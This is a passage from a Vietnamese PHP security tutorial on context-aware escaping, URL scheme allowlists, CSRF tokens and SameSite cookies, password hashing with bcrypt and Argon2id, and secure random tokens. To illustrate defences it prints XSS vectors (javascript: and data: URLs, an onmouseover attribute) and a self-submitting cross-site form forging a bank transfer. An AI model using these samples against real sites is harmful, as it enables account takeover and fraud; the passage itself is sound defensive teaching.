| Thuộc tính HTML | `<input value="DATA">` | `htmlspecialchars` **và luôn đặt giá trị trong nháy** |
| Giá trị tham số URL | `<a href="/s?q=DATA">` | `rawurlencode()` (hoặc `http_build_query()` cho cả bộ tham số), rồi `htmlspecialchars` cả URL |
| URL người dùng nhập | `<a href="DATA">` | Kiểm scheme thuộc allowlist `http`/`https` (mục 3.4), rồi `htmlspecialchars` |
| Trong `<script>` | `const x = DATA;` | `json_encode` với `JSON_HEX_TAG \| JSON_HEX_APOS \| JSON_HEX_AMP \| JSON_HEX_QUOT`; hoặc truyền qua `data-*` |
| CSS | `style="color: DATA"` | Tránh. Nếu buộc phải có, chỉ nhận giá trị trong allowlist (ví dụ `red`, `#a1b2c3` kiểm bằng regex chặt) |

Vì sao không dùng `htmlspecialchars` cho dữ liệu trong `<script>`? Vì trong khối `<script>`, trình
duyệt không giải mã HTML entity: `&quot;` vẫn là 6 ký tự `&quot;` chứ không thành `"`. Ngược lại, chuỗi
`</script>` xuất hiện ở bất cứ đâu, kể cả bên trong một chuỗi JS, đều đóng khối script. Các cờ
`JSON_HEX_TAG` (đổi `<` `>` thành `\u003C` `\u003E`), `JSON_HEX_APOS`, `JSON_HEX_QUOT`, `JSON_HEX_AMP`
làm cho output không chứa ký tự nào có nghĩa với HTML, mà JS vẫn hiểu đúng giá trị. (Mặc định
`json_encode` đã escape `/` thành `\/`, nên `</script>` thành `<\/script>`; đừng bật
`JSON_UNESCAPED_SLASHES` cho dữ liệu nhúng vào trang.)

Có những vị trí mà dù mã hoá thế nào cũng không nên đặt dữ liệu người dùng: làm tên thẻ, tên thuộc tính,
trong thuộc tính sự kiện (`onclick="..."`), trong comment HTML, làm đối số chuỗi cho `eval()` hay
`setTimeout()` của JS.

### 3.4 URL do người dùng nhập và rich text

Trường "website cá nhân" là chỗ lọt XSS rất hay gặp, vì `javascript:alert(1)` không chứa ký tự nào bị
`htmlspecialchars` đổi, và `FILTER_VALIDATE_URL` cũng chấp nhận nó (mục 1.3). Phải kiểm scheme bằng
allowlist:

```php
<?php
declare(strict_types=1);

function safeLink(string $url): ?string
{
    $scheme = parse_url($url, PHP_URL_SCHEME);
    if (!is_string($scheme) || !in_array(strtolower($scheme), ['http', 'https'], true)) {
        return null;                                   // không phải link web tuyệt đối: từ chối
    }
    return $url;
}

var_dump(safeLink('https://example.com/a'));                     // in ra: string(21) "https://example.com/a"
var_dump(safeLink('JavaScript:alert(1)'));                       // in ra: NULL
var_dump(safeLink('data:text/html,<script>alert(1)</script>'));  // in ra: NULL
var_dump(safeLink(' javascript:alert(1)'));                      // in ra: NULL
var_dump(safeLink('//evil.example/x'));                          // in ra: NULL
```

Dòng thứ tư cho thấy giá trị của allowlist: `parse_url` coi chuỗi có dấu cách đầu là một *path* (không
có scheme), nhưng trình duyệt bỏ khoảng trắng đầu và chạy `javascript:`. Code kiểu denylist "từ chối
nếu scheme là `javascript`" sẽ cho chuỗi này qua; code allowlist "chỉ nhận khi scheme là http/https" thì
không. (Hàm này từ chối cả đường dẫn tương đối; nếu nghiệp vụ cần, xử lý riêng.)

*Rich text* (người dùng được nhập HTML, như trình soạn thảo bài viết) không escape được, vì escape làm
mất định dạng. Phải *sanitize*: parse HTML rồi chỉ giữ thẻ và thuộc tính trong allowlist, bằng thư
viện chuyên dụng (phía PHP phổ biến là HTML Purifier, cài qua Composer). ⚠️ `strip_tags()` **không**
phải công cụ chống XSS: tham số thứ hai cho phép giữ lại thẻ, nhưng giữ nguyên mọi thuộc tính của thẻ đó:

```php
<?php
declare(strict_types=1);

echo strip_tags('<a href="#" onmouseover="alert(1)">hi</a>', '<a>'), "\n";
// in ra: <a href="#" onmouseover="alert(1)">hi</a>      <- thuộc tính sự kiện vẫn còn
```

### 3.5 Các lớp phòng thủ thêm

Escape đúng là lớp chính. Các lớp sau giảm thiệt hại khi một chỗ escape bị sót:

- *Content Security Policy* (CSP): header báo trình duyệt chỉ chạy script từ nguồn cho phép, ví dụ
  `header("Content-Security-Policy: default-src 'self'; script-src 'self'");`. Chính sách không cho
  inline script thì `<script>` chèn vào trang sẽ không chạy. CSP là lớp thứ hai, không thay escape.
- Cookie phiên đặt `HttpOnly`: JavaScript không đọc được cookie đó qua `document.cookie`
  ([Chương 15](15-php-va-web.md)). ⚠️ Không chặn được XSS: script vẫn gửi request thay người dùng, và
  trình duyệt vẫn tự kèm cookie.
- API trả JSON phải gửi `Content-Type: application/json`, không phải `text/html` (mặc định của PHP),
  để trình duyệt không render JSON như HTML khi ai đó mở thẳng URL.
- Header `X-Content-Type-Options: nosniff` để trình duyệt không tự đoán kiểu nội dung.

## 4. CSRF và token

### 4.1 CSRF là gì

*CSRF* (*Cross-Site Request Forgery*, giả mạo request liên site) lợi dụng một hành vi bình thường của
trình duyệt: **mỗi request gửi tới `bank.example` đều tự kèm cookie của `bank.example`**, bất kể request
đó được tạo ra từ trang nào. Server nhận diện người dùng bằng cookie phiên, nên không phân biệt được
request người dùng chủ động gửi với request do một trang khác tạo ra thay họ.

Kịch bản: người dùng đang đăng nhập `bank.example` (có cookie phiên), rồi mở một trang ở `evil.example`.
Trang này chứa:

```html
<form action="https://bank.example/transfer" method="POST">
  <input type="hidden" name="to" value="tai-khoan-ke-gian">
  <input type="hidden" name="amount" value="10000000">
</form>
<script>document.forms[0].submit();</script>
```

Form tự submit, trình duyệt gửi `POST /transfer` kèm cookie phiên của nạn nhân, server thấy cookie hợp
lệ và chuyển tiền. Kẻ tấn công không cần đọc được cookie; họ chỉ cần trình duyệt nạn nhân **gửi** nó.

CSRF khả thi khi đủ ba điều kiện:

1. Có một hành động đáng để kích hoạt (đổi email, đổi mật khẩu, chuyển tiền, xoá dữ liệu).
2. Server nhận diện người dùng **chỉ** bằng thứ trình duyệt tự gửi (cookie, HTTP Basic auth).
3. Mọi tham số của request đều đoán trước được. Form đổi mật khẩu bắt nhập mật khẩu cũ thì kẻ tấn công
   không điền được, nên không CSRF được.

So với XSS: CSRF chỉ khiến trình duyệt **gửi** request, kẻ tấn công không đọc được response (chính sách
*same-origin* của trình duyệt chặn). XSS thì chạy script ngay trong trang của bạn, đọc được mọi thứ, kể
cả CSRF token. Vì vậy **có XSS là mọi biện pháp chống CSRF bị vô hiệu**; chống CSRF tốt không thay
được việc chống XSS.

### 4.2 Quy tắc số một: GET không đổi trạng thái

Request `GET` có thể được kích hoạt bằng một thẻ ảnh, một link, thậm chí trình duyệt tự tải trước:

```html
<img src="https://bank.example/transfer?to=tai-khoan-ke-gian&amount=10000000">
```

Nên mọi hành động **thay đổi dữ liệu** (tạo, sửa, xoá, đăng xuất, đăng ký gói) phải dùng `POST`,
`PUT`, `PATCH` hoặc `DELETE`. `GET` chỉ để đọc. Đây cũng là ngữ nghĩa HTTP chuẩn: `GET` là *safe
method*. Các biện pháp bên dưới chỉ bảo vệ các method không an toàn, nên một route `GET /delete?id=5`
nằm ngoài mọi lớp bảo vệ.

### 4.3 Synchronizer token

Cách chặn kinh điển: server sinh một *CSRF token* ngẫu nhiên, lưu trong session, nhúng vào mọi form.
Khi nhận request đổi trạng thái, server so token gửi lên với token trong session. Trang ở
`evil.example` không đọc được HTML trang của bạn (same-origin policy), nên không biết token để điền vào
form giả.

```php
<?php
declare(strict_types=1);

// Lấy token của phiên; tạo mới nếu chưa có. $session đóng vai $_SESSION.
function csrfToken(array &$session): string
{
    if (!isset($session['csrf_token'])) {
        $session['csrf_token'] = bin2hex(random_bytes(32));   // 64 ký tự hex, không đoán được
    }
    return $session['csrf_token'];
}

// Kiểm token gửi lên; thiếu hoặc sai đều là false (fail closed)
function csrfValid(array $session, mixed $submitted): bool
{
    return isset($session['csrf_token'])
        && is_string($submitted)
        && hash_equals($session['csrf_token'], $submitted);
}

$session = [];                                     // phiên của người dùng thật

// GET /profile: in form kèm token
$token = csrfToken($session);
echo '<input type="hidden" name="_token" value="', htmlspecialchars($token), '">', "\n";
// in ra: <input type="hidden" name="_token" value="a6da...c486">   (64 ký tự hex, mỗi lần chạy một khác)
echo strlen($token), "\n";                         // in ra: 64

// POST từ chính form của ta: có token đúng
var_dump(csrfValid($session, $token));             // in ra: bool(true)
// POST từ evil.example: trình duyệt vẫn gửi cookie phiên, nhưng trang lạ không biết token
var_dump(csrfValid($session, null));               // in ra: bool(false)
var_dump(csrfValid($session, 'doan-bua'));         // in ra: bool(false)
var_dump(csrfValid($session, ['mang']));           // in ra: bool(false)  (?_token[]=x gửi lên thành mảng)
```

Ghi nhớ từ đoạn code:

- Token sinh bằng `random_bytes` (mục 6), không bằng `md5(time())` hay `uniqid()`.
- So bằng `hash_equals` (mục 6.3). Kiểm `is_string` trước, vì người dùng gửi được `_token[]=x` và
  `$_POST['_token']` khi đó là mảng; truyền mảng vào `hash_equals` ném `TypeError`.
- Ghép vào web thật: sau `session_start()`, với mọi request `POST` gọi
  `csrfValid($_SESSION, $_POST['_token'] ?? null)`; sai thì `http_response_code(403)` và dừng.
- Request AJAX gửi token qua header (ví dụ `X-CSRF-Token`) thay vì field form.
- Không đặt token trong URL: URL bị ghi vào log, lịch sử trình duyệt, header `Referer`.
- Khi người dùng đăng nhập, `session_regenerate_id(true)` để đổi ID phiên ([Chương 15](15-php-va-web.md)),
  và nên sinh token mới.

### 4.4 Các lớp bổ sung: `SameSite`, `Origin`, `Sec-Fetch-Site`

**Thuộc tính `SameSite` của cookie** bảo trình duyệt khi nào được gửi cookie trong request liên site:

| Giá trị | Ý nghĩa |
|---|---|
| `Strict` | Không bao giờ gửi cookie trong request khởi nguồn từ site khác, kể cả khi người dùng bấm link từ site khác sang |
| `Lax` | Chỉ gửi khi người dùng điều hướng cả trang bằng method an toàn (bấm link, GET); không gửi với form POST liên site, ảnh, iframe, `fetch` |
| `None` | Luôn gửi (kiểu cũ); bắt buộc đi kèm `Secure` |

⚠️ `session.cookie_samesite` trong `php.ini` mặc định là chuỗi rỗng, tức PHP không gửi thuộc tính này
và hành vi phụ thuộc trình duyệt. Hãy đặt rõ, ví dụ `session.cookie_samesite = "Lax"` (cách cấu hình
cookie phiên ở [Chương 15](15-php-va-web.md)). `SameSite=Lax` chặn được form POST tự submit ở mục 4.1,
nhưng nó là lớp phụ, không thay token: `Lax` vẫn gửi cookie với `GET` điều hướng (lại một lý do để GET
không đổi trạng thái), và "same-site" bao gồm cả các subdomain khác của bạn.

**Header `Origin` và `Sec-Fetch-Site`** do trình duyệt tự gắn, JavaScript của trang khác không giả được:

- `Origin: https://evil.example` cho biết request khởi nguồn từ origin nào (gửi kèm hầu hết request
  `POST`).
- `Sec-Fetch-Site` (nhóm header *Fetch Metadata*) có một trong bốn giá trị `same-origin`, `same-site`,
  `cross-site`, `none` (người dùng tự gõ URL hoặc mở bookmark). Trình duyệt chỉ gửi nó qua kết nối an
  toàn (HTTPS).

Chính sách đơn giản: với method không an toàn, từ chối nếu `Sec-Fetch-Site` là `cross-site`; nếu
không có header (trình duyệt cũ, HTTP thường) thì rơi về kiểm token. ⚠️ Khi so `Origin`, so **nguyên
origin** với giá trị cấu hình, đừng so tiền tố: `https://bank.example.evil.example` bắt đầu bằng
`https://bank.example`.

Laravel 13 kết hợp đúng hai lớp này trong middleware `PreventRequestForgery` (nằm sẵn trong nhóm `web`):
kiểm `Sec-Fetch-Site` trước, `same-origin` thì cho qua; không xác minh được thì rơi về kiểm token
(`_token` trong form do `@csrf` sinh, hoặc header `X-CSRF-TOKEN`/`X-XSRF-TOKEN`), sai thì trả HTTP 419.
Chi tiết ở [Chương 24](24-laravel-routing-controller-middleware.md).

### 4.5 Hai trường hợp đặc biệt

- **API dùng `Authorization: Bearer <token>`** (không dùng cookie) không bị CSRF kiểu cổ điển, vì trình
  duyệt không tự gắn header này; trang khác muốn gắn thì phải biết token. Nhưng nếu API **cũng** chấp
  nhận cookie phiên (SPA đăng nhập bằng cookie), CSRF quay lại và cần token như form thường.
- **Login CSRF**: kẻ tấn công làm trình duyệt nạn nhân đăng nhập vào **tài khoản của kẻ tấn công**. Nạn
  nhân không để ý, nhập thẻ tín dụng hay lịch sử tìm kiếm vào tài khoản đó, và kẻ tấn công đọc được. Vì
  vậy form đăng nhập cũng cần CSRF token.

## 5. Lưu mật khẩu: `password_hash`, `password_verify`, `password_needs_rehash`

### 5.1 Vì sao không lưu mật khẩu, mà lưu hash

Giả sử một ngày bảng `users` bị lộ: qua SQL injection, qua bản backup để quên trên server, qua một nhân
viên cũ. Câu hỏi thiết kế là: lúc đó kẻ tấn công lấy được gì?

- Lưu mật khẩu dạng rõ (*plaintext*): họ có ngay mật khẩu của mọi người, và vì người dùng hay dùng lại
  mật khẩu, họ thử luôn ở Gmail, ngân hàng.
- *Mã hoá* (*encrypt*) mật khẩu: mã hoá là hai chiều, có khoá là giải ra được. Khoá thường nằm cùng
  server với DB; lộ DB thì khả năng cao lộ cả khoá.
- *Hash*: hàm một chiều, từ kết quả không tính ngược ra đầu vào. Lúc đăng nhập, ta hash mật khẩu người
  dùng gõ rồi so với hash đã lưu; không bao giờ cần mật khẩu gốc. Đây là cách đúng.

Nhưng "hash" ở đây không phải `md5()` hay `hash('sha256', ...)`. Kẻ tấn công có bản dump không cần
đảo ngược hash; họ **đoán**: lấy từng mật khẩu ứng viên (từ danh sách mật khẩu đã lộ ở các vụ khác, từ
điển, vét cạn), hash nó, so với hash trong DB. Việc này chạy trên máy của họ (*offline attack*), không
bị giới hạn số lần thử, không để lại log. Tốc độ hash quyết định tất cả, mà MD5, SHA-1, SHA-256 được
thiết kế để **nhanh**:

```php
<?php
declare(strict_types=1);

$n = 100_000;
$t = hrtime(true);
for ($i = 0; $i < $n; $i++) {
    md5("matkhau$i");
}
$md5PerSec = $n / ((hrtime(true) - $t) / 1e9);

$t = hrtime(true);
password_hash('matkhau', PASSWORD_BCRYPT, ['cost' => 12]);
$bcryptSec = (hrtime(true) - $t) / 1e9;

printf("md5: khoảng %s lần/giây\n", number_format($md5PerSec, 0, ',', '.'));
printf("bcrypt cost 12: %.3f giây/lần, tức khoảng %.1f lần/giây\n", $bcryptSec, 1 / $bcryptSec);
// Output minh hoạ trên một máy thử (số của bạn sẽ khác):
// md5: khoảng 4.511.355 lần/giây
// bcrypt cost 12: 0.208 giây/lần, tức khoảng 4.8 lần/giây
```

Cùng một máy, bcrypt chậm hơn MD5 cỡ một triệu lần. Đó chính là mục đích: người dùng thật chỉ chờ thêm
khoảng 0,2 giây mỗi lần đăng nhập, còn kẻ tấn công thử một tỷ mật khẩu thì chi phí tăng một triệu lần.
Kẻ tấn công thật dùng GPU, nhanh hơn PHP rất nhiều, nhưng tỷ lệ chênh lệch giữa hash nhanh và hash chậm
vẫn giữ nguyên ý nghĩa.

Hai khái niệm đi kèm:

- *Salt*: chuỗi ngẫu nhiên riêng cho từng mật khẩu, trộn vào trước khi hash và lưu cùng hash. Salt
  không cần bí mật. Nó làm hai người cùng mật khẩu `123456` có hai hash khác nhau, làm bảng tra cứu tính
  sẵn (*rainbow table*) vô dụng, và buộc kẻ tấn công đoán riêng cho từng người.
- *Cost* (hay *work factor*): tham số chỉnh độ chậm. Với bcrypt, số vòng lặp là 2^cost, nên tăng cost
  thêm 1 thì thời gian gấp đôi. Phần cứng mạnh lên thì tăng cost lên theo.

Bạn không phải tự lo salt hay tự ghép thuật toán: PHP có sẵn bộ ba hàm `password_*` làm đúng cả.

### 5.2 `password_hash`: tạo hash

```php
password_hash(string $password, string|int|null $algo, array $options = []): string
```

- `$algo` nhận một trong các hằng: `PASSWORD_DEFAULT` (hiện là bcrypt), `PASSWORD_BCRYPT`,
  `PASSWORD_ARGON2I`, `PASSWORD_ARGON2ID`. Hai hằng Argon2 chỉ có khi PHP được build kèm hỗ trợ Argon2.
- Salt được sinh tự động bằng bộ sinh số ngẫu nhiên an toàn. Từ PHP 8.0, option `salt` truyền tay bị bỏ
  qua (kèm cảnh báo).
- Kết quả là một chuỗi **tự mô tả**: chứa thuật toán, cost, salt và hash.

```
  $2y$12$dicqP5r1r3sBt/e3VwboR.ZmKEhWcFxxJz/9Wy96VJuHNnzJwbQui
  └┬┘ └┬┘ └─────────┬──────────┘└──────────────┬─────────────┘
   │   │      salt (22 ký tự)          hash (31 ký tự)
   │   cost = 12 (2^12 vòng)
   thuật toán: 2y = bcrypt
```

Vì mọi thông tin cần để kiểm tra đều nằm trong chuỗi, bảng chỉ cần **một cột** cho hash, và một bảng có
thể chứa lẫn hash cũ (cost 10) với hash mới (cost 12) trong giai đoạn chuyển đổi. Manual khuyên cột rộng
255 ký tự (ví dụ `VARCHAR(255)`), vì `PASSWORD_DEFAULT` được thiết kế để có thể đổi sang thuật toán mạnh
hơn ở bản PHP sau, và độ dài kết quả có thể thay đổi. Bcrypt hiện cho đúng 60 ký tự.

⚠️ **Cost mặc định của bcrypt là 12 từ PHP 8.4** (RFC *bcrypt_cost_2023*); trước đó là 10. Chạy cùng
đoạn code trên hai bản:

```php
<?php
declare(strict_types=1);

$hash = password_hash('mat-khau-cua-an', PASSWORD_DEFAULT);
echo strlen($hash), "\n";                 // in ra: 60
echo substr($hash, 0, 7), "\n";           // PHP 8.3: $2y$10$     PHP 8.4+: $2y$12$
print_r(password_get_info($hash));
// PHP 8.4+ in ra:
// Array
// (
//     [algo] => 2y
//     [algoName] => bcrypt
//     [options] => Array
//         (
//             [cost] => 12
//         )
//
// )
var_dump(PASSWORD_BCRYPT_DEFAULT_COST);   // PHP 8.3: int(10)     PHP 8.4+: int(12)
```

Chọn cost thế nào: manual PHP gợi ý đo trên chính server của bạn và chọn mức để một lần hash mất dưới
khoảng 350 ms với đăng nhập tương tác; OWASP yêu cầu bcrypt tối thiểu cost 10. Cost quá cao thì chính
bạn bị DoS (mục 5.6). Cost hợp lệ của bcrypt là 4 tới 31; ngoài khoảng đó `password_hash` ném
`ValueError`.

### 5.3 `password_verify`: kiểm tra khi đăng nhập

```php
password_verify(string $password, string $hash): bool
```

Hàm đọc thuật toán, cost và salt từ chính chuỗi `$hash`, hash lại `$password` theo đúng các thông số đó
rồi so sánh. Manual ghi rõ hàm này an toàn trước *timing attack* (so sánh với thời gian không phụ thuộc
vị trí khác nhau, mục 6.3). Bạn không bao giờ tự `password_hash()` lại rồi so bằng `===`: mỗi lần
`password_hash` sinh salt mới nên kết quả luôn khác nhau.

### 5.4 `password_needs_rehash`: nâng cấp hash cũ

```php
password_needs_rehash(string $hash, string|int|null $algo, array $options = []): bool
```

Trả `true` nếu `$hash` không khớp thuật toán hoặc option bạn đang truyền vào. Vấn đề nó giải quyết: khi
bạn tăng cost (hoặc chuyển sang Argon2id, hoặc nâng PHP lên 8.4 làm cost mặc định đổi), những hash đã
lưu vẫn ở cấu hình cũ, và bạn không thể hash lại vì **không có mật khẩu gốc**. Thời điểm duy nhất có mật
khẩu gốc là lúc người dùng đăng nhập thành công. Nên luồng đăng nhập chuẩn là: verify, nếu đúng thì kiểm
`password_needs_rehash`, cần thì hash lại và lưu.

```php
<?php
declare(strict_types=1);

// "Bảng users" giả: hash của An được tạo từ hồi app còn chạy PHP 8.3 (cost 10)
$users = [
    'an@example.com' => password_hash('ngua-o-dau-tram-nam', PASSWORD_BCRYPT, ['cost' => 10]),
];

// Hash thật (cost 12) của một chuỗi không ai biết; dùng khi email không tồn tại (mục 5.6)
const DUMMY_HASH = '$2y$12$dicqP5r1r3sBt/e3VwboR.ZmKEhWcFxxJz/9Wy96VJuHNnzJwbQui';

/** @param array<string, string> $users */
function login(array &$users, string $email, #[\SensitiveParameter] string $password): bool
{
    if (strlen($password) > 72) {                 // bcrypt chỉ đọc 72 byte đầu (mục 5.6)
        return false;
    }
    $hash = $users[$email] ?? null;
    if ($hash === null) {
        password_verify($password, DUMMY_HASH);   // tốn thời gian như khi email tồn tại
        return false;
    }
    if (!password_verify($password, $hash)) {
        return false;
    }
    // Đăng nhập đúng: lúc DUY NHẤT ta có mật khẩu gốc để hash lại theo cấu hình hiện tại
    if (password_needs_rehash($hash, PASSWORD_DEFAULT)) {
        $users[$email] = password_hash($password, PASSWORD_DEFAULT);
        echo "  (đã nâng cấp hash)\n";
    }
    return true;
}

echo password_get_info($users['an@example.com'])['options']['cost'], "\n";  // in ra: 10
var_dump(login($users, 'khong-co@example.com', 'abc'));                     // in ra: bool(false)
var_dump(login($users, 'an@example.com', 'sai-mat-khau'));                  // in ra: bool(false)
var_dump(login($users, 'an@example.com', 'ngua-o-dau-tram-nam'));
// PHP 8.4+ in ra:   (đã nâng cấp hash)
//                 bool(true)
// PHP 8.3 chỉ in bool(true): cost mặc định của 8.3 là 10, hash không cần nâng cấp
echo password_get_info($users['an@example.com'])['options']['cost'], "\n";  // PHP 8.4+: 12
var_dump(login($users, 'an@example.com', 'ngua-o-dau-tram-nam'));           // in ra: bool(true) (không nâng cấp nữa)
```

`#[\SensitiveParameter]` (PHP 8.2) đánh dấu tham số nhạy cảm: nếu có exception và stack trace được ghi
log, giá trị của tham số này bị thay bằng object `SensitiveParameterValue` thay vì lộ mật khẩu dạng rõ.
Bản thân `password_hash` và `password_verify` cũng khai báo attribute này cho tham số `$password`.

Người dùng không bao giờ đăng nhập lại thì hash cũ nằm đó mãi. Với hash yếu thật sự (ví dụ app cũ lưu
MD5), cách hay dùng là bắt các tài khoản đó đặt lại mật khẩu.

### 5.5 Argon2id

*Argon2* thắng cuộc thi Password Hashing Competition năm 2015. Biến thể nên dùng là *Argon2id*. Điểm
khác bcrypt là Argon2 *memory-hard*: mỗi lần hash bắt buộc dùng một lượng RAM lớn, nên GPU (rất nhiều
nhân nhưng ít RAM cho mỗi nhân) khó chạy song song hàng loạt. OWASP xếp Argon2id là lựa chọn đầu tiên,
bcrypt là lựa chọn cho hệ thống *legacy* (khi không có Argon2id/scrypt).

```php
<?php
declare(strict_types=1);

// Chỉ dùng được khi PHP build kèm Argon2: kiểm bằng in_array('argon2id', password_algos(), true)
$hash = password_hash('ngua-o-dau-tram-nam', PASSWORD_ARGON2ID, [
    'memory_cost' => 19456,   // KiB, tức 19 MiB
    'time_cost'   => 2,       // số lượt
]);
echo $hash, "\n";
// output minh hoạ: $argon2id$v=19$m=19456,t=2,p=1$<salt base64>$<hash base64>
var_dump(password_verify('ngua-o-dau-tram-nam', $hash));   // bool(true)
```

- Ba option: `memory_cost` (KiB), `time_cost` (số lượt), `threads` (số luồng; chỉ chỉnh được khi PHP dùng
  thư viện libargon2, không chỉnh được khi Argon2 do extension sodium cung cấp). Mặc định trong mã nguồn
  PHP là 65536 KiB (64 MiB), 4 lượt, 1 luồng (hằng `PASSWORD_ARGON2_DEFAULT_MEMORY_COST`,
  `PASSWORD_ARGON2_DEFAULT_TIME_COST`, `PASSWORD_ARGON2_DEFAULT_THREADS`).
- Mức tối thiểu OWASP khuyến nghị: 19 MiB RAM, 2 lượt, 1 luồng (như ví dụ). Với 64 MiB mỗi lần hash, 50
  request đăng nhập đồng thời đã cần 50 × 64 = 3.200 MiB RAM; tính trước với số worker PHP-FPM của bạn.
- `password_verify` và `password_needs_rehash` hoạt động y hệt. Chuyển một hệ thống từ bcrypt sang
  Argon2id chỉ cần đổi thuật toán truyền vào `password_hash`/`password_needs_rehash`: hash bcrypt cũ vẫn
  verify được, và được nâng cấp dần khi người dùng đăng nhập.

Máy dùng để chạy thử ví dụ chương này không có Argon2, nên output trên là minh hoạ theo định dạng manual
mô tả. Bcrypt cost 12 vẫn là lựa chọn chấp nhận được và là mặc định của PHP lẫn Laravel.

### 5.6 Cạm bẫy khi lưu mật khẩu

**Bcrypt chỉ dùng 72 byte đầu.** Manual ghi rõ với `PASSWORD_BCRYPT`, mật khẩu bị cắt ở tối đa 72 byte.
Hai mật khẩu giống nhau ở 72 byte đầu được coi là một:

```php
<?php
declare(strict_types=1);

$prefix = str_repeat('a', 72);
$hash = password_hash($prefix . 'XYZ', PASSWORD_BCRYPT);
var_dump(password_verify($prefix . 'khac-han', $hash));   // in ra: bool(true)  ⚠️

try {
    password_hash("abc\0def", PASSWORD_BCRYPT);           // chứa byte NUL
} catch (ValueError $e) {
    echo $e->getMessage(), "\n";   // in ra: Bcrypt password must not contain null character
}
```

Đơn vị là **byte**, không phải ký tự: chữ tiếng Việt có dấu tốn 2 tới 3 byte trong UTF-8 (`strlen('ệ')`
là 3), nên một câu passphrase tiếng Việt có thể chạm giới hạn chỉ sau vài chục ký tự. Cách xử lý: giới
hạn độ dài tối đa 72 byte ở bước validate và báo lỗi rõ ràng (như hàm `login` ở 5.4 làm), hoặc dùng
Argon2id (không có giới hạn này). Đừng tự "pre-hash" kiểu `password_hash(hash('sha256', $pw, true), ...)`:
output nhị phân có thể chứa byte NUL (bản PHP hiện tại ném `ValueError` như ví dụ trên; bcrypt gốc thì
cắt ngầm tại byte NUL đầu tiên). Nếu buộc phải pre-hash, OWASP khuyên HMAC với một *pepper* (khoá bí mật
lưu ngoài DB) rồi base64 trước khi đưa vào bcrypt.

**Hash chậm là mục tiêu DoS.** Mỗi lần đăng nhập tốn 0,2 giây CPU, nên vài chục request song song đủ
chiếm hết worker. Giới hạn độ dài mật khẩu, và giới hạn số lần thử (*rate limit*) theo IP và theo tài
khoản.

**Lộ email tồn tại qua thời gian phản hồi** (*user enumeration*). Code thường `return false` ngay khi
không tìm thấy email (mất chưa tới 1 ms), còn email có thật thì phải chạy bcrypt (khoảng 200 ms). Đo thời
gian là biết email nào đã đăng ký. Hàm `login` ở 5.4 xử lý bằng cách vẫn `password_verify` với một hash
giả. ⚠️ Hash giả phải là hash **hợp lệ, cùng cost** với hash thật: `password_verify('x', 'garbage')`
trả `false` gần như tức thì vì chuỗi không đúng định dạng, nên không che được gì. Thông báo lỗi cũng
phải giống nhau ("Email hoặc mật khẩu không đúng"), không tách "email không tồn tại" với "sai mật khẩu".

**Không ghi mật khẩu vào log.** Log request, log exception, log SQL đều có thể chứa mật khẩu dạng rõ. Lọc
các field nhạy cảm trước khi log và dùng `#[\SensitiveParameter]`.

Laravel bọc bộ hàm này trong `Hash::make`, `Hash::check`, `Hash::needsRehash`, mặc định bcrypt với cost
đọc từ biến `BCRYPT_ROUNDS` (mặc định 12), và tự rehash khi đăng nhập
([Chương 28](28-laravel-auth.md)).

## 6. Số ngẫu nhiên an toàn và so sánh bí mật

### 6.1 Vì sao `rand()`, `mt_rand()`, `uniqid()` không dùng được cho bí mật

Token đặt lại mật khẩu, CSRF token, API key, mã OTP, session ID: tất cả an toàn **chỉ khi không ai đoán
được**. Có hai loại bộ sinh số ngẫu nhiên:

- *PRNG* (*pseudo-random number generator*) thông thường: tính số tiếp theo từ một trạng thái bên trong
  bằng công thức cố định. Thiết kế để nhanh và phân phối đều, không để khó đoán. Biết trạng thái (hoặc
  *seed*, giá trị khởi đầu) là biết mọi số tiếp theo.
- *CSPRNG* (*cryptographically secure PRNG*): thấy bao nhiêu output trước đó cũng không suy ra được output
  tiếp theo. Thường lấy entropy từ hệ điều hành (trên Linux là `getrandom()` hoặc `/dev/urandom`).

`rand()` (từ PHP 7.1 là alias của `mt_rand()`) và `mt_rand()` dùng thuật toán Mersenne Twister, là PRNG.
Manual ghi rõ: không sinh giá trị an toàn mật mã, không được dùng cho mục đích cần giá trị không đoán
được.

```php
<?php
declare(strict_types=1);

// Cùng seed thì ra cùng dãy số: ai biết (hoặc dò ra) seed là biết mọi "số ngẫu nhiên" tiếp theo
mt_srand(12345);
echo mt_rand(), ' ', mt_rand(), "\n";      // in ra: 1996335345 1911592690
mt_srand(12345);
echo mt_rand(), ' ', mt_rand(), "\n";      // in ra: 1996335345 1911592690

// uniqid() là thời gian hiện tại (micro giây) viết dưới dạng hex: gọi liền nhau ra giá trị rất gần nhau
echo uniqid(), "\n";                       // output minh hoạ: 6ac0d40019640
echo uniqid(), "\n";                       // output minh hoạ: 6ac0d40019a28
```

Seed của Mersenne Twister chỉ có 32 bit, và có công cụ công khai dò ngược seed từ một vài giá trị
`mt_rand()` quan sát được (ví dụ một mã giảm giá bạn nhận được), từ đó tính ra token người khác sẽ nhận.
`uniqid()` thì manual cảnh báo hai lần: không an toàn mật mã, và thậm chí **không bảo đảm duy nhất**.
Kẻ tấn công biết khoảng thời gian token được tạo là thu hẹp được còn vài triệu khả năng.

⚠️ Lỗi hay gặp trong code thật: `md5(time())`, `md5(uniqid())`, `sha1(mt_rand())`. Hash một giá trị đoán
được thì kết quả vẫn đoán được: kẻ tấn công chỉ cần hash từng giá trị ứng viên. Hash không thêm được chút
entropy nào.

### 6.2 `random_bytes`, `random_int` và `Random\Randomizer`

PHP có sẵn ba công cụ CSPRNG:

| Hàm | Trả về | Dùng cho |
|---|---|---|
| `random_bytes(int $length): string` | `$length` byte ngẫu nhiên | Token, khoá mã hoá, salt tự làm |
| `random_int(int $min, int $max): int` | Số nguyên phân phối đều trong `[$min, $max]` | OTP, chọn ngẫu nhiên phần tử |
| `Random\Randomizer` (8.2) với engine `Random\Engine\Secure` (engine mặc định) | Nhiều method: `getInt`, `getBytes`, `shuffleArray`, `getBytesFromString` (8.3)... | Khi cần API phong phú hơn |

```php
<?php
declare(strict_types=1);

// Token cho link đặt lại mật khẩu, API key, CSRF token: 32 byte = 256 bit ngẫu nhiên
$bytes = random_bytes(32);
echo strlen($bytes), "\n";                       // in ra: 32   (byte thô, có thể chứa ký tự không in được)
$hex = bin2hex($bytes);                          // mỗi byte thành 2 ký tự hex
echo strlen($hex), "\n";                         // in ra: 64

// base64url: gọn hơn hex, an toàn trong URL (thay + / bằng - _, bỏ dấu = ở cuối)
$b64url = rtrim(strtr(base64_encode($bytes), '+/', '-_'), '=');
echo strlen($b64url), "\n";                      // in ra: 43

// Mã OTP 6 chữ số: random_int phân phối đều; sprintf giữ số 0 ở đầu
$otp = sprintf('%06d', random_int(0, 999999));
echo strlen($otp), "\n";                         // in ra: 6

